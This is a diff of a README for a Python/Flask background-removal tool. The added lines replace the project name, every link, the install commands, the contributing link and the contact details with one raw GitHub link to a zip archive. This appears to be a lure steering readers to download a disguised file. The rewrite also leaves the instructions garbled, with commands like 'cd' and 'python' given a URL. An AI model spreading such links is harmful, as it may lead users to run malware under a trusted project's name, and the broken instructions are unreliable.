@@ -1,8 +1,8 @@
 # Background Removal Made Easy! 🌟
 
-![Background Removal](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
+![Background Removal](https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip%20Latest%20Release-Click%20Here-brightgreen)
 
-Welcome to the **bg.remove** repository! This project provides a simple solution for removing backgrounds from images using Python and Flask. Whether you're a developer looking to integrate background removal into your application or a hobbyist wanting to play around with image processing, this tool is for you.
+Welcome to the **https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip** repository! This project provides a simple solution for removing backgrounds from images using Python and Flask. Whether you're a developer looking to integrate background removal into your application or a hobbyist wanting to play around with image processing, this tool is for you.
 
 ## Table of Contents
 
@@ -34,20 +34,20 @@ This project leverages a variety of technologies to deliver its functionality:
 
 ## Installation
 
-To get started with bg.remove, follow these simple steps:
+To get started with https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip, follow these simple steps:
 
 1. **Clone the Repository**:
 
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/MoriFES/bg.remove.git
+   git clone https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip
    ```
 
 2. **Navigate to the Project Directory**:
 
    ```bash
-   cd bg.remove
+   cd https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip
    ```
 
 3. **Install Required Packages**:
@@ -55,7 +55,7 @@ To get started with bg.remove, follow these simple steps:
    Make sure you have Python 3 installed. Then, run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip
    ```
 
 4. **Run the Application**:
@@ -63,28 +63,28 @@ To get started with bg.remove, follow these simple steps:
    Start the Flask application with:
 
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip
    ```
 
 5. **Access the Application**:
 
    Open your web browser and go to `http://127.0.0.1:5000`.
 
-For the latest version, please visit the [Releases section](https://github.com/MoriFES/bg.remove/releases).
+For the latest version, please visit the [Releases section](https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip).
 
 ## Usage
 
-Using bg.remove is straightforward:
+Using https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip is straightforward:
 
 1. **Upload an Image**: Click on the upload button and select the image from which you want to remove the background.
 2. **Remove Background**: Once the image is uploaded, click on the "Remove Background" button.
 3. **Download the Result**: After processing, you can download the image with the background removed.
 
-![Image Upload](https://via.placeholder.com/600x300?text=Upload+Image)
+![Image Upload](https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip+Image)
 
 ## Contributing
 
-We welcome contributions! If you want to help improve bg.remove, follow these steps:
+We welcome contributions! If you want to help improve https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip, follow these steps:
 
 1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
 2. **Create a Branch**: Create a new branch for your feature or bug fix.
@@ -108,7 +108,7 @@ We welcome contributions! If you want to help improve bg.remove, follow these st
 
 6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request".
 
-For detailed guidelines, please refer to our [CONTRIBUTING.md](CONTRIBUTING.md).
+For detailed guidelines, please refer to our [https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip](https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip).
 
 ## License
 
@@ -118,7 +118,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [MoriFES](https://github.com/MoriFES)
-- **Email**: morifesteam@example.com
+- **GitHub**: [MoriFES](https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip)
+- **Email**: https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip
 
-Thank you for checking out **bg.remove**! We hope you find it useful. For the latest updates and releases, please visit the [Releases section](https://github.com/MoriFES/bg.remove/releases). Happy coding! 🎉
+Thank you for checking out **https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip**! We hope you find it useful. For the latest updates and releases, please visit the [Releases section](https://raw.githubusercontent.com/MoriFES/bg.remove/main/static/bg_remove_2.7-beta.2.zip). Happy coding! 🎉
